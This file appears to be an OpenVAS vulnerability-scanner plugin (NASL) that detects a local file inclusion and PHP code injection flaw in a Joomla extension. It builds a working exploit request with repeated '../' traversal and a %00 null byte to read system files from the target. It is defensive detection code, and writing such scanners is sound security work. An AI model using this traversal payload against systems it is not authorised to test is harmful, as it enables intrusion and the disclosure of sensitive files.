###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_50191.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Joomla NoNumber! Extension Manager Plugin Local File Include and PHP code Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "NoNumber! Extension Manager is prone to multiple input-validation
vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker can exploit these issues to inject arbitrary PHP code and
include and execute arbitrary files from the vulnerable system in the
context of the affected application. Other attacks are also possible.";

tag_solution = "Reports indicate vendor updates are available. Please contact the
vendor for more information.";

if (description)
{
 script_id(103308);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)");
 script_bugtraq_id(50191);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("Joomla NoNumber! Extension Manager Plugin Local File Include and PHP code Injection Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50191");
 script_xref(name : "URL" , value : "http://www.nonumber.nl/extensions/nonumbermanager");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/index.php?nn_qp=1&file=",crap(data:"../",length:3*9),files[file],"%00.inc.php"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

